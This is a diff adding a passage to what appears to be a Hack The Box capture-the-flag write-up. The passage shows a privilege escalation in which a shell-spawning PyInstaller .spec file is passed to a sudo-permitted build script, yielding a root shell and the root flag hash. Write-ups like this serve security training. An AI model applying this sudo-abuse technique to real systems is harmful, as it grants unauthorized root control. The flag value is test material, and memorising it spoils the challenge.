@@ -109,3 +109,19 @@ _laurel      776  0.0  0.2  13064  8948 ?        S<   05:42   0:04 /usr/local/sb
 svc         1306  0.0  0.5  32540 23348 ?        Ss   05:42   0:00 python3 /var/www/ws_server/server.py
 tkeller    22307  0.0  0.0   6608  2476 pts/0    S+   07:31   0:00 grep --color=auto 1306
 
+```
+tkeller@socket:~$ echo 'import os;os.system("/bin/bash")' > root.spec
+tkeller@socket:~$ ls
+linpeas.sh  root.spec  snap  user.txt
+tkeller@socket:~$ sudo /usr/local/sbin/build-installer.sh build root.spec
+123 INFO: PyInstaller: 5.6.2
+123 INFO: Python: 3.10.6
+126 INFO: Platform: Linux-5.15.0-67-generic-x86_64-with-glibc2.35
+129 INFO: UPX is not available.
+root@socket:/home/tkeller# cat /root/root.tx
+cat: /root/root.tx: No such file or directory
+root@socket:/home/tkeller# cat /root/root.txt
+7173a098ec93374dce2059554c8cd749
+```
+
+https://www.hackthebox.com/achievement/machine/256742/535
